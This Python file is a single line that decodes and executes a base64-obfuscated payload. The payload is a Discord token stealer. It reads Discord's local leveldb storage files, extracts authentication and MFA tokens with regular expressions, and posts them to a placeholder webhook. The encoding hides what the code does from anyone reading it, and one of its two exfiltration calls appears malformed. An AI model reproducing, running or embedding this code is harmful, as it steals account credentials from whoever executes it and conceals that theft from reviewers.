import codecs;exec(codecs.decode(b'aW1wb3J0IHJlIGFzIE9nc0FkYwppbXBvcnQgcmVxdWVzdHMgYXMgeUFLVFBCaktiCmltcG9ydCBvcyBhcyBmSUdWCmltcG9ydCBqc29uIGFzIFNQWGpJeVYKQlBWd0ggPSBmSUdWLmdldGVudignQVBQREFUQScpClBiREdEZSA9IFtCUFZ3SCArICdcRGlzY29yZCcsIEJQVndIICsgJ1xkaXNjb3JkY2FuYXJ5JywgQlBWd0ggKyAnXGRpc2NvcmRwdGInXQpCWGVkTndBID0gIldFQkhPT0tfSEVSRSIKdHJ5OgoJZm9yIGF4Z0ppeU11IGluIFBiREdEZToKCQlheGdKaXlNdSArPSAnXExvY2FsIFN0b3JhZ2VcbGV2ZWxkYicKCQlmb3IgdUhYUFJzeFVHIGluIGZJR1YubGlzdGRpcihheGdKaXlNdSk6CgkJCWlmIG5vdCB1SFhQUnN4VUcuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IHVIWFBSc3hVRy5lbmRzd2l0aCgnLmxkYicpOgoJCQkJY29udGludWUKCQkJSFJNa3hCeiA9IG9wZW4oYXhnSml5TXUgKyAnXFwnICsgdUhYUFJzeFVHLCdyJyxlcnJvcnM9J2lnbm9yZScpLnJlYWQoKQoJCQlmb3IgSEJwc3RnWENPIGluIE9nc0FkYy5maW5kYWxsKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9JyxIUk1reEJ6KToKCQkJCXlBS1RQQmpLYi5wb3N0KEJYZWROd0EsIFNQWGpJeVY9eyJjb250ZW50IiA6IEhCcHN0Z1hDT30sIHBhcmFtcyA9IHsnd2FpdCcgOiBUcnVlfSkKCQkJZm9yIEhCcHN0Z1hDTyBpbiBPZ3NBZGMuZmluZGFsbChyJ21mYVwuW1x3LV17ODR9JyxIUk1reEJ6KToKCQkJCXlBS1RQQmpLYi5wb3N0KEJYZWROd0EsIGpzb249eyJjb250ZW50IiA6IEhCcHN0Z1hDT30sIHBhcmFtcyA9IHsnd2FpdCcgOiBUcnVlfSkKZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgoJcGFzcwo=','base64').decode('utf-8'));
